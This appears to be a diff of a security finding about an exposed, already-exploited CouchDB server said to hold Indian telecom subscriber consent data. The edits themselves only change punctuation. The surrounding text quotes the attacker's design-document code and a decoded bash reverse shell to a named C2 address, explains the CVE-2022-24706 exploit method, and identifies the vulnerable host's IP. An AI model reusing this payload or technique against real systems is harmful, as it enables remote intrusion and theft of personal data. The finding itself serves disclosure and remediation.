@@ -2,12 +2,12 @@
 type: host
 ---
 
-# CouchDB Telecom Consent Platform — Active RCE + 244M Subscriber Records
+# CouchDB Telecom Consent Platform: Active RCE + 244M Subscriber Records
 _Date: 2026-05-09 | IP: 20.198.76.169 | Severity: CRITICAL_
 
 ## Summary
 
-Unauth CouchDB 2.3.1 on Microsoft Azure (Pune, India) hosting Airtel + Tata telecom consent management infrastructure. 7.1M consent records, 244M subscriber preferences with MSISDN phone numbers. Instance has been actively exploited via CVE-2022-24706 — 9 attack design documents present including a live reverse shell beacon to `57.131.25.205:4444` (OVH Roubaix, France).
+Unauth CouchDB 2.3.1 on Microsoft Azure (Pune, India) hosting Airtel + Tata telecom consent management infrastructure. 7.1M consent records, 244M subscriber preferences with MSISDN phone numbers. Instance has been actively exploited via CVE-2022-24706. 9 attack design documents present including a live reverse shell beacon to `57.131.25.205:4444` (OVH Roubaix, France).
 
 ## Technical Details
 
@@ -40,20 +40,20 @@ function(doc){ require("child_process").exec("bash -c 'bash -i >& /dev/tcp/57.13
 
 Payload decoded from base64: `bash -i >& /dev/tcp/57.131.25.205/4444 0>&1`
 
-**C2:** `57.131.25.205` — `vps-8f3a0f07.vps.ovh.net`, OVH Roubaix FR, ports 22+3389 open (Ubuntu 22.04, RDP).
+**C2:** `57.131.25.205`. `vps-8f3a0f07.vps.ovh.net`, OVH Roubaix FR, ports 22+3389 open (Ubuntu 22.04, RDP).
 
-Trigger document present: `{"_id":"trigger","pwn":"yes"}` — exploitation confirmed.
+Trigger document present: `{"_id":"trigger","pwn":"yes"}`. Exploitation confirmed.
 
 ### Vulnerability: CVE-2022-24706
 
-CouchDB "admin party" — when no admin is configured, all users have admin rights. Attacker writes a design document with a `map` function containing `require('child_process')`. When any view is queried, the function executes as the CouchDB process user. Full RCE without credentials.
+CouchDB "admin party". When no admin is configured, all users have admin rights. Attacker writes a design document with a `map` function containing `require('child_process')`. When any view is queried, the function executes as the CouchDB process user. Full RCE without credentials.
 
 ## Impact
 
-- **244M+ MSISDN (phone number) records** readable without authentication — India subscriber base
-- **Active reverse shell beacon** — attacker may have persistent shell access to Azure host
+- **244M+ MSISDN (phone number) records** readable without authentication. India subscriber base
+- **Active reverse shell beacon**: attacker may have persistent shell access to Azure host
 - **Regulatory:** India PDPB / TRAI TCCCPR consent records directly accessible; LSCC compliance data exposed
-- **Scope:** Multi-operator (`airtel.com`, `tata.com`) — consent infrastructure for India's two largest telecom carriers
+- **Scope:** Multi-operator (`airtel.com`, `tata.com`). Consent infrastructure for India's two largest telecom carriers
 
 ## Attribution
 
@@ -61,7 +61,7 @@ C2 server `57.131.25.205` (OVH FR) last indexed 2026-04-25. Consistent with auto
 
 ## Remediation
 
-1. Isolate host immediately — active reverse shell may be live
+1. Isolate host immediately. Active reverse shell may be live
 2. Rotate all credentials stored in or accessible from this host
 3. Enable CouchDB admin account: `curl -X PUT http://host:5984/_node/nonode@nohost/_config/admins/admin -d '"password"'`
 4. Delete exploit design documents from `exploit` DB
